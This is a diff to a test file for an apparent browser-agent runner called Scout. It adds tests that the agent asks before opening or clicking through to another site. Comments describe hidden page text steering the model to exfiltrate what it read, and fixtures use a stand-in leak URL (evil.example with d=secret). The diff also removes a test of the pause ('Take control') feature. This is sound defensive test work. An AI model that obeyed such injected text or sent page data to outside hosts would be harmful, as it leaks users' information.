@@ -59,7 +59,7 @@ interface Harness {
 
 function harness(
   provider: ProviderClient,
-  opts: { confirm?: (r: ConfirmRequest) => Promise<ConfirmDecision>; access?: Partial<PageAccess>; url?: string; screenshot?: boolean; onAct?: (a: TaskAction) => void; navigate?: (url: string) => Promise<void> } = {},
+  opts: { confirm?: (r: ConfirmRequest) => Promise<ConfirmDecision>; access?: Partial<PageAccess>; url?: string; screenshot?: boolean; onAct?: (a: TaskAction) => void; navigate?: (url: string) => Promise<void>; goal?: string; source?: "panel" | "chat" } = {},
 ): Harness {
   const h: Harness = { acts: [], opened: [], overlay: [], events: [], logs: [], icons: [], asked: [], timeline: [], control: new AgentControl(), deps: undefined as never };
   let access = parsePageAccess(opts.access ?? {});
@@ -68,7 +68,8 @@ function harness(
   h.deps = {
     provider,
     model: "m",
-    goal: "Buy the widget",
+    goal: opts.goal ?? "Buy the widget",
+    source: opts.source ?? "panel",
     control: h.control,
     page: {
       snapshot: async () => ({ ...SNAP, url: opts.url ?? SNAP.url }),
@@ -165,7 +166,8 @@ describe("Scout mode runner", () => {
       [act([{ type: "navigate", url: "google.com" }, { type: "click", target: { ref: "e3" } }])],
       [finish("On Google.")],
     ]);
-    const h = harness(provider);
+    // The task names google.com, so opening it is not asked (audit 2026-10-24).
+    const h = harness(provider, { goal: "go to Google.com" });
     const out = await runTask(h.deps);
     expect(out).toMatchObject({ status: "done", summary: "On Google." });
     expect(h.opened).toEqual(["https://google.com/"]);
@@ -190,9 +192,67 @@ describe("Scout mode runner", () => {
     expect(textOf(provider.seen[1]!.messages[2]!.content)).toContain("blocked.test is blocked in Settings");
   });
 
+  // Audit 2026-10-24: hidden page text can tell the model to open a link that
+  // carries what Scout read to another site, so a site the task is not on is asked first.
+  it("asks before opening another site; a denial leaves the tab alone, and an allowed site is not asked again", async () => {
+    const leak = "https://evil.example/c?d=secret";
+    const denied = scripted([[act([{ type: "navigate", url: leak }])], [finish("x")]]);
+    const h = harness(denied);
+    await runTask(h.deps);
+    expect(h.asked).toHaveLength(1);
+    expect(h.asked[0]).toMatchObject({ kind: "leave_site", site: "shop.test" });
+    expect(h.asked[0]!.reason).toContain("evil.example");
+    expect(h.opened).toEqual([]);
+    expect(textOf(denied.seen[1]!.messages[2]!.content)).toContain("approval_denied");
+
+    const twice = scripted([[act([{ type: "navigate", url: "https://other.example/a" }])], [act([{ type: "navigate", url: "https://www.other.example/b" }])], [finish("x")]]);
+    const ok = harness(twice, { confirm: async () => "once" });
+    await runTask(ok.deps);
+    expect(ok.asked).toHaveLength(1);
+    expect(ok.opened).toEqual(["https://other.example/a", "https://www.other.example/b"]);
+  });
+
+  // Review 2026-10-24: a task the chat starts has a goal the chat model wrote,
+  // after reading pages, so the sites it names are not trusted.
+  it("a goal written by the chat model does not let Scout open the sites it names", async () => {
+    const provider = scripted([[act([{ type: "navigate", url: "https://evil.example/c?d=secret" }])], [finish("x")]]);
+    const h = harness(provider, { goal: "open evil.example", source: "chat" });
+    await runTask(h.deps);
+    expect(h.asked).toHaveLength(1);
+    expect(h.asked[0]).toMatchObject({ kind: "leave_site" });
+    expect(h.opened).toEqual([]);
+  });
+
+  // Review 2026-10-24: a link is the easier way for a page to send Scout elsewhere.
+  it("asks before clicking a link to another site, not one on the same site", async () => {
+    const link = (href: string): ProbeResult => ({ x: 5, y: 5, name: "Read more", role: "link", tag: "a", href });
+    const away = scripted([[act([{ type: "click", target: { ref: "e3" } }])], [finish("x")]]);
+    const h = harness(away);
+    h.deps.page.probe = async () => link("https://evil.example/form");
+    await runTask(h.deps);
+    expect(h.asked).toHaveLength(1);
+    expect(h.asked[0]).toMatchObject({ kind: "leave_site" });
+    expect(h.acts).toEqual([]);
+
+    const home = scripted([[act([{ type: "click", target: { ref: "e3" } }])], [finish("x")]]);
+    const ok = harness(home);
+    ok.deps.page.probe = async () => link("https://www.shop.test/help");
+    await runTask(ok.deps);
+    expect(ok.asked).toHaveLength(0);
+    expect(ok.acts.map((a) => a.type)).toEqual(["click"]);
+  });
+
+  it("opens pages on the site the task started on without asking", async () => {
+    const provider = scripted([[act([{ type: "navigate", url: "https://checkout.shop.test/pay" }])], [finish("x")]]);
+    const h = harness(provider);
+    await runTask(h.deps);
+    expect(h.asked).toHaveLength(0);
+    expect(h.opened).toEqual(["https://checkout.shop.test/pay"]);
+  });
+
   it("reports a failed navigation instead of hanging", async () => {
     const provider = scripted([[act([{ type: "navigate", url: "https://google.com" }])], [finish("x")]]);
-    const h = harness(provider, { navigate: async () => Promise.reject(new Error("tabs.update unavailable")) });
+    const h = harness(provider, { goal: "search google.com", navigate: async () => Promise.reject(new Error("tabs.update unavailable")) });
     await runTask(h.deps);
     expect(textOf(provider.seen[1]!.messages[2]!.content)).toContain("Scout could not open that address in this tab.");
   });
@@ -273,30 +333,6 @@ describe("Scout mode runner", () => {
     const firstClick = h.timeline.find((t) => t.what === "act:click")!.at;
     expect(firstClick - firstMarker).toBeGreaterThanOrEqual(15);
     expect(h.acts[1]).toEqual({ type: "click", target: { x: 200, y: 150 } });
-  });
-
-  it("Take control stops the next action within 250 ms and Resume continues", async () => {
-    const provider = scripted([[act([{ type: "click", target: { ref: "e3" } }, { type: "wait", ms: 5000 }, { type: "click", target: { ref: "e3" } }])], [finish("ok")]]);
-    const h = harness(provider);
-    const run = runTask(h.deps);
-    // Pause as soon as the first click lands: the 5 s wait and the next click must not run.
-    await new Promise<void>((resolve) => {
-      const tick = (): void => (h.acts.length ? resolve() : void setTimeout(tick, 2));
-      tick();
-    });
-    const pausedAt = Date.now();
-    h.control.pause();
-    await new Promise((r) => setTimeout(r, 300));
-    expect(h.acts).toHaveLength(1);
-    expect(h.events.some((e) => e.kind === "state" && e.state === "paused")).toBe(true);
-    expect(h.overlay.some((c) => c.type === "state" && c.state === "paused")).toBe(true);
-    const pausedEvent = h.timeline.find((t) => t.what === "overlay:state" && t.at >= pausedAt - Date.now() - 1000);
-    expect(pausedEvent).toBeDefined();
-    h.control.resume();
-    const out = await run;
-    expect(out.status).toBe("done");
-    expect(h.acts).toHaveLength(2);
-    expect(h.overlay.filter((c) => c.type === "state").map((c) => (c as { state: string }).state)).toEqual(["paused", "running"]);
   });
 
   it("Stop ends the task, hides the overlay at once, and restores the toolbar icon", async () => {
